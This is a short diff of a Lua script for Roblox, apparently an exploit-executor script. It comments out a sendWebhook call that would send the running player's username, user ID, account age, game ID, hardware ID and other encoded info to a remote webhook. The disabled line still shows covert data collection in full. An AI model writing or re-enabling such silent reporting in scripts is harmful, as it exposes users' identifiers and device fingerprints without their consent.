@@ -234,5 +234,5 @@ local function sendWebhook(message)
     })
 end
 
-sendWebhook(" | NEW LOGIN : USERNAME: "..game.Players.LocalPlayer.Name.." | DISPLAY NICKNAME : "..game.Players.LocalPlayer.DisplayName.." | USERID : "..game.Players.LocalPlayer.UserId.." | ACCOUNT AGE : "..game.Players.LocalPlayer.AccountAge.." | GAMEID : "..game.GameId.." | HWID : "..gethwid().." | OTHER INFO : "..game:GetService("HttpService"):JSONEncode(a(b())))
+--sendWebhook(" | NEW LOGIN : USERNAME: "..game.Players.LocalPlayer.Name.." | DISPLAY NICKNAME : "..game.Players.LocalPlayer.DisplayName.." | USERID : "..game.Players.LocalPlayer.UserId.." | ACCOUNT AGE : "..game.Players.LocalPlayer.AccountAge.." | GAMEID : "..game.GameId.." | HWID : "..gethwid().." | OTHER INFO : "..game:GetService("HttpService"):JSONEncode(a(b())))
 print("success loaded")
